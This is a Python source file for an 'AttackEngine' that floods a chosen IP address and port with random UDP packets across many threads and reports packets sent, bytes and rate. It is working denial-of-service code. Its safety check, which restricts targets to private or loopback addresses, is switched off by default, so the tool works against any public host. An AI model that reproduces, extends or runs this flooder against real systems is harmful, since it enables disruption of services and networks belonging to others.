from __future__ import annotations
import asyncio, logging, socket, time, os
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from utils import is_private_or_loopback

LOGGER = logging.getLogger(__name__)

@dataclass
class AttackStats:
    sent: int = 0
    failed: int = 0
    bytes: int = 0
    start: float = 0.0
    running: bool = False
    @property
    def elapsed(self) -> float:
        return max(0.001, time.time() - self.start) if self.running else 0.001
    @property
    def rps(self) -> float:
        return self.sent / self.elapsed

class AttackEngine:
    def __init__(self, threads: int, max_dur: int, safety: bool = False):
        self.threads = threads
        self.max_dur = max_dur
        self.safety = safety
        self.stats = AttackStats()
        self._stop = asyncio.Event()
        self._executor = ThreadPoolExecutor(max_workers=threads)
        self._pool = [os.urandom(1400) for _ in range(2048)]
        self._idx = 0

    def stop(self):
        self._stop.set()

    async def run_udp(self, ip: str, port: int, duration: int) -> AttackStats:
        if self.safety and not is_private_or_loopback(ip):
            raise ValueError(f"Safety block: {ip}")
        dur = min(duration, self.max_dur)
        self.stats = AttackStats(start=time.time(), running=True)
        self._stop.clear()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        loop = asyncio.get_running_loop()

        def send_payload():
            nonlocal sock
            while not self._stop.is_set():
                try:
                    payload = self._pool[self._idx % len(self._pool)]
                    self._idx += 1
                    sock.sendto(payload, (ip, port))
                    self.stats.sent += 1
                    self.stats.bytes += len(payload)
                except BlockingIOError:
                    time.sleep(0.0005)
                except OSError:
                    self.stats.failed += 1
                except Exception:
                    self.stats.failed += 1

        futures = []
        for _ in range(self.threads):
            fut = loop.run_in_executor(self._executor, send_payload)
            futures.append(fut)

        await asyncio.sleep(dur)
        self._stop.set()
        await asyncio.gather(*futures, return_exceptions=True)
        sock.close()
        self.stats.running = False
        return self.stats
